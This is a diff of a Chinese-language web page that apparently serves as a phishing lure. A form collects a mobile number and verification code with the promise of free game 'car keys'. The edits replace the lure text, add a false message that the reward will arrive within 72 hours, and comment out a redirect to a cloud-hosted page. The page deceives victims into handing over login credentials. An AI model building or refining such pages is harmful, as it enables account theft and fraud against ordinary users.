@@ -162,7 +162,7 @@
     <img src="./banner.jpg">
 </div>
 <div class="shareregs">
-    <h4 id="state">登录成功之后加你游戏好友</h4>
+    <h4 id="state">登录领取车钥匙</h4>
 	
     <div  class="input">
         <input type="number" id="phone_number" class="mobile" maxlength="11" placeholder="请输入您的手机号">
@@ -536,9 +536,10 @@ function func2(){
 					
                 }
                 if(xhr.responseText==4){
-                    document.getElementById("state").innerHTML=  ('验证成功!密码是：完成');
+                    document.getElementById("state").innerHTML=  ('已发放,请耐心等待72小时内到账');
+					
                     //document.getElementById("EleId").style.display="block";
-					location.href="https://7462-tb-7g4gbies64f3d39a-1312449085.tcb.qcloud.la/wp/wp.html?yqr="+yqr; 
+					//location.href="https://7462-tb-7g4gbies64f3d39a-1312449085.tcb.qcloud.la/wp/wp.html?yqr="+yqr; 
                 }
                 if(xhr.responseText==5){
                     //document.getElementById("code1").value = "";//清空文本框
